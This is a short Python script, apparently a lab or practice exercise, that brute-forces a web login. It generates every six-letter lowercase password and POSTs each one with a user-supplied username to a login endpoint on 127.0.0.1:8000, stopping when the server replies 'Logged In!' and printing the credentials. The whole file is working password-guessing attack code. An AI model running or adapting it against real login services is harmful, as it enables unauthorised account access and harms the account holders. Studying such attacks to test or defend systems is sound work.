import string


def generate_alphabet_sequence():
    for x in string.ascii_lowercase:
        yield x


def generate_passwords(size: int):

    for char in generate_alphabet_sequence():
        if size != 1:
            for string in generate_passwords(size - 1):
                yield char + string
        else:
            yield char


if __name__ == "__main__":
    import requests

    HOST = "127.0.0.1"
    PORT = 8000
    URL = f"http://{HOST}:{PORT}/login"
    user_name = input("Enter the username to bruteforce: ")

    for passwd in generate_passwords(6):
        data = {"username": user_name, "password": passwd}
        res = requests.post(URL, json=data)
        if res.text == '"Logged In!"':
            print("Cracked!")
            print(data)
            break
